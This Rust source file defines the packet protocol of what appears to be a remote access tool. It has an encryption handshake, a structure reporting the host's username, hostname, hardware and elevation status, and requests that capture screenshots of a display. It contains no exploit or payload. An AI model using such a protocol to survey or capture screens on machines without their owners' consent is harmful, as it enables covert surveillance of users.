use rmp_serde::{Deserializer, Serializer};
use serde::{Deserialize, Serialize};

#[derive(Debug, PartialEq, Eq, Clone, Deserialize, Serialize)]
pub struct ClientInfo {
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub is_elevated: bool,
}

pub trait Packet {
    fn serialized(&self) -> Vec<u8>;
    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error>
    where
        Self: std::marker::Sized;
}

/// Packets going from client to the server.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ServerboundPacket {
    EncryptionRequest,
    EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token


    InitClient,
    ScreenshotDisplay(String),

}

impl Packet for ServerboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }
}

/// Packets going from the server to client.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ClientboundPacket {
    EncryptionResponse(Vec<u8>, Vec<u8>), // channel's public key and token
    EncryptionAck,
    ClientInfo(ClientInfo),
    ScreenshotResult(Vec<u8>),

    Reconnect,
    Disconnect,
}

impl Packet for ClientboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }
}
